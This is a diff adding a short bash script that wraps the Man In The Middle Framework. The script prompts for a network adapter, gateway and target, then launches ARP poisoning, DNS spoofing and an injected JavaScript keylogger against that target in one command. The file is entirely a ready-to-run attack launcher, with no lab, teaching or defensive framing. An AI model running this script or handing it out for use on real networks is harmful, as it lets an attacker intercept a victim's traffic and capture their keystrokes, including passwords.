@@ -1,0 +1,13 @@
+#!/bin/bash
+echo "Welcome to the Man In The Middle Framework (MITMF) ARP Posion and JSkeyLogger interface script"
+echo "-------------------------------------------------------------------------------"
+ip link show
+echo "-------------------------------------------------------------------------------"
+echo "Enter Adapter to use:"
+read adapter
+echo "Enter Gateway to use:"
+read gateway
+echo "Enter Target to use:"
+read target
+echo "-------------------------------------------------------------------------------"
+mitmf -i $adapter --arp --dns --spoof --gateway $gateway --target $target --jskeylogger
